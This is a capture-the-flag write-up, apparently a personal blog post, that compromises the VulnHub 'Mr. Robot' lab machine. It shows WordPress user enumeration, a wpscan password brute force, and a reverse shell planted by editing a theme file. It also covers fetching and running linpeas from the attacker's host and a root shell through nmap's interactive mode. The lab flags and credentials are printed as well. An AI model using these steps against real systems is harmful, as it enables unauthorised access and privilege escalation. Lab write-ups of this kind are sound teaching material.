---
layout: post
title:  "mrrobot from vulnhub"
date:   2019-03-23 1:30:36 +0530
categories: Vilnhub writeup 
---







## starting with a regular nmap 
## sudo nmap -sC -sV -oA nmap/mrrobot 192.168.56.3

```bash
sudo nmap -sC -sV -oA nmap/mrrobot 192.168.56.3  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-23 21:24 EDT  
Nmap scan report for 192.168.56.3  
Host is up (0.00037s latency).  
Not shown: 997 filtered tcp ports (no-response)  
PORT    STATE  SERVICE  VERSION  
22/tcp  closed ssh  
80/tcp  open   http     Apache httpd  
|_http-title: Site doesn't have a title (text/html).  
|_http-server-header: Apache  
443/tcp open   ssl/http Apache httpd  
|_http-title: Site doesn't have a title (text/html).  
| ssl-cert: Subject: commonName=www.example.com  
| Not valid before: 2015-09-16T10:45:03  
|_Not valid after:  2025-09-13T10:45:03  
|_http-server-header: Apache  
MAC Address: 08:00:27:31:04:53 (Oracle VirtualBox virtual NIC)  
  
Service detection performed. Please report any incorrect results at ht
```




## now port 80 is  open and 443 
## so lets take a look at both first lets start with 80
![[1.png]]
## it seems just a html page with some javascript but there is no any user input to play with here and looking at port 443 it is the same thing so i run gobuster to discover directories in the background while i try afew things manually

```bash
sudo gobuster dir -u http://192.168.56.3 -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobu  
ster-root.out
```

## first i tried to search for robots.txt and boom we have the first flag of 3 and fsociety dictionary so let's grap those 2 interesting files 
## flag : 073403c8a58a1f80d943455fb30724b9
![[2.png]]

## now i try to think why they give me this huge wordlist so i'm gusseing the next step is to perform a bruteforce attack but where? and we still haven't any login pages or usernames so let's back to our recon in the background gobuster


## it's found a /wp-admin dir which indicates this is a wordpress and it's have a /blog dir too so let's take a look but first fire some recon and we will use wpscan
## since i don't have any usernames let's try to find a way that let us to enumrate valid usernames and try basic login with admin:admin and it respond with 
![[6.png]]

invalid username so this good we have a way to know valid usernames i tried some usernames from mrrobot series itself and after a while i get this when try elliot as username

![[5.png]]

## now we have a valid username so let's bruteforce the password with this wordlist but first let's pick the uniqe values from this list cuz it's very big and it would take alot of time 
```bash
cat fsocity.dic | sort -u | uniq -c | awk '{print $2}' > sorted.dic
```
## this will grab only unique values from this list i used wpscan to bruteforce and could use hydra or medusa as well 
```bash
wpscan --url http://192.168.56.3/wp-login.php -U elliot -P sorted.dic
```

![[7.png]]

## Username: elliot, Password: ER28-0652 let's login to wordpress 
![[9.png]]
## look's like the user elliot is admin so we have a way to get a reverse shell This can be done very easily by editing a .php that is available already in the wordpress site and there is alot of other ways just a small google search. Click on Appearence →Editor →Choose any php file in my case i’ll choose 404.php and replace the content with  php reverse shell and save now browse the file you edited 
http://192.168.56.3/wordpress/wp-content/themes/twentyfifteen/404.php

## and boom shell as daemon user 
![[10.png]]

## getting a proper tty shell 
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl-z
stty raw -echo; fg
hit enter twice
export TERM=xterm // so i can clear the screen
```

##  so let's go to the/home/ directory, where there was a single home directory for a user named robot; which included the second key! found 2 files one of them is the second flag we don't have read access and the other is password.raw-md5 which contain robot:c3fcd3d76192e4007dfb496cca67e13b username and this looks like a md5 hash because this is 32 char and this is the md5 structure let's google this hash and see 
```# MD5 reverse for c3fcd3d76192e4007dfb496cca67e13b

The MD5 hash:  
c3fcd3d76192e4007dfb496cca67e13b  
was succesfully reversed into the string:  
abcdefghijklmnopqrstuvwxyz // this is the password

Feel free to provide some other MD5 hashes you would like to try to reverse.
```

## try to su -robot and then enter the password and we are escelate to robot user! 

```bash
daemon@linux:/home/robot$ su - robot  
Password:    
$ bash  
robot@linux:~$ cat    
key-2-of-3.txt    password.raw-md5     
robot@linux:~$ cat key-2-of-3.txt    
822c73956184f694993bede3eb39f959  // second flag
robot@linux:~$
```

## let's run linpeas script to check for privilege escalation but first let's transfer linpeas to the machine 
```bash
wget 192.168.56.1/linpeas.sh
chmod +x linpeas.sh // make it executable
./linpeas.sh // run it
```

![[11.png]]

##  It had an old version of nmap running so let's go to gtfobins and type nmap 
https://gtfobins.github.io/

![[12.png]]

```bash
robot@linux:/dev/shm$ nmap --interactive  
  
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )  
Welcome to Interactive Mode -- press h <enter> for help  
nmap> !sh
#
```
## then we are rooted the box  let's read the last flag
```bash
# cd /root  
# ls  
firstboot_done  key-3-of-3.txt  
# cat key-3-of-3.txt  
04787ddef27c3dee1ee161b21670b4e4  // the root flag
#
```
